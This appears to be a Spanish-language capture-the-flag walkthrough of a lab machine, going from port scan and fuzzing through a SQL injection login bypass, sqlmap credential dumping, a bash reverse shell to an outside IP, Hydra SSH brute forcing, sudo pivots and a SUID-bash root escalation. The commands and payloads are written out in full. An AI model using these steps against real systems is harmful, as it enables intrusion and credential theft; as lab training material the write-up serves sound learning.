PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y no parece haber nada interesante

-hacemos fuzzing y encontramos un directorio con un panel de login --> /login_page

-Probamos una Sqli (Sql Injection) sencilla haber que pasa:
	-usuario: 'or true-- -
	-Contraseña: a 
	-Conseguimos saltarnos el panel de login

-Como crear un script de Python para explotar --> Sqli (Blind Time Based)
	[[Showtime (Python Script)]]

-Parece que el panel es vulnerable a SQLI, vamos a probar con la herramienta SQLMAP a ver si conseguimos más información.

-Estructura básica de Sqlmap:
	-sqlmap -u 'http://172.17.0.2/login_page/' --dbs --batch --forms
		--dbs: Enumera bases de datos.
		--batch: Para que Sqlmap nos vaya respondiendo de forma automática a cada pregunta que nos hace.
		--forms: Le indica que analice formularios HTML.
	-Nos ha reportado lo siguiente:
		fetching database names
		retrieved: 'mysql'
		retrieved: 'information_schema'
		retrieved: 'performance_schema'
		retrieved: 'sys'
		retrieved: 'users'

-Ahora que sabemos los nombres de las BD, vamos a enumerar las tablas de la BD 'users':
	-sqlmap -u 'http://172.17.0.2/login_page/' -D users --tables --batch --forms
		-D: Nombre de la BD.
		--tables: Lista las tablas.
	-Nos ha reportado lo siguiente:
		Database: users
		{1 table}
		+----------+
		| usuarios |
		+----------+
-El siguiente paso es enumerar columnas de la tabla obtenida:
	-sqlmap -u 'http://172.17.0.2/login_page/' -D users -T usuarios --columns --batch --forms
		-T: Nombre de la tabla.
		--columns: Muestra las columnas
	-Nos ha reportado lo siguiente:
		Database: users
		Table: usuarios
		{3 columns}
		+----------+--------------+
		| Column   | Type         |
		+----------+--------------+
		| id       | int unsigned |
		| password | varchar(50)  |
		| username | varchar(50)  |
		+----------+--------------+
-El última paso es listar los registros de las columnas:
	-sqlmap -u 'http://172.17.0.2/login_page/' -D users -T usuarios -C password,username --dump --batch --forms
		-C: Nombre de las columnas.
		--dump: Extrae los datos de las columnas.
	-Nos ha reportado lo siguiente:
		Database: users
		Table: usuarios
		{3 entries}
		+----------+----------------------+
		| username | password             |
		+----------+----------------------+
		| lucas    | 123321123321         |
		| santiago | 123456123456         |
		| joe      | MiClaveEsInhackeable |
		+----------+----------------------+
-También se puede dumpear los datos de las columnas desde la tabla directamente:
	-sqlmap -u 'http://172.17.0.2/login_page/' -D users -T usuarios --dump --batch --forms 

-Vamos a la ruta /login_page y nos autenticamos con el usuario joe

-Al entrar tenemos una consola para ejecutar comandos en python. Nos mandamos una reverse shell de la siguiente forma:
	import os
	os.system("bash -c 'bash -i >& /dev/tcp/192.168.236.128/1234 0>&1'")
	www-data@f975781385e6:/home$

## Escalada de Privilegios

-No podemos ejecutar comandos como sudo ni tenemos permisos SUID interesantes

-Vemos los usuarios que hay en el sistema:
	-cat /etc/passwd | grep sh
		root:x:0:0:root:/root:/bin/bash
		joe:x:1001:1001:joe,,,:/home/joe:/bin/bash
		luciano:x:1002:1002:luciano,,,:/home/luciano:/bin/bash

-Enumeramos archivos y directorios que pertenezcan a cada uno de los usuarios para ver si encontramos algo interesante (Ignoramos las 'a'):
	-find / -user joe ! -path "/proc/a*" 2>/dev/null
	-find / -user luciano ! -path "/proc/a*" 2>/dev/null
	-No encontramos nada interesante

-Probamos con root, hay que excluir varios directorios para ver la respuesta más clara:
	-find / -user root ! -path "/proc/a*" ! -path "/usr/a*" ! -path "/sys/a*" 2>/dev/null 
	-Encontramos el siguiente archivo:
		/tmp/.hidden_text.txt

-El contenido de '/tmp/.hidden_text.txt' son un montón de posibles contraseñas, creamos un archivo 'users.txt' con joe, luciano y root y otro 'passwords.txt' con las contraseñas encontradas. Después hacemos una ataque de fuerza bruta con Hydra:
	-hydra ssh://172.17.0.2 -L users.txt -P passwords.txt -V  
	-NO encuentra nada.

-Vamos a probar a transformar las contraseñas del fichero 'passwords.txt' a minúsculas y volver a realizar el ataque:
	-cat passwords.txt | tr '[:upper:]' '[:lower:]' > passwords_minus.txt
	-hydra ssh://172.17.0.2 -L users.txt -P passwords_minus.txt -V
		login: joe   password: chittychittybangbang
		-Hemos encontrado la contraseña!!

-Pivotamos al usuario joe:
	-su joe
	-password: chittychittybangbang
	joe@f975781385e6:

-Comandos que puede ejecutar el usuario joe a nivel de sudo:
	joe@f975781385e6:/tmp$ sudo -l
		(luciano) NOPASSWD: /bin/posh

-Buscamos en Gtfobins y pivotamos el usuario luciano de la siguiente forma:
	-sudo -u luciano /bin/posh
	luciano@f975781385e6:

-Comandos que puede ejecutar luciano a nivel de sudoers:
	luciano@f975781385e6:/tmp$ sudo -l
		(root) NOPASSWD: /bin/bash /home/luciano/script.sh
		-rw-rw-r-- 1 luciano luciano 112 Jul 23  2024 /home/luciano/script.sh

-Tenemos capacidad de escritura en un script que podemos ejecutar como root. 'Nano' no está instalado , asi que utilizamos 'echo':
	-echo 'chmod +s /bin/bash' > /home/luciano/script.sh
	-Ejecutamos el script como root y escalamos privilegios:
		-sudo /bin/bash /home/luciano/script.sh
		-bash -p
		bash-5.2# whoami
		root
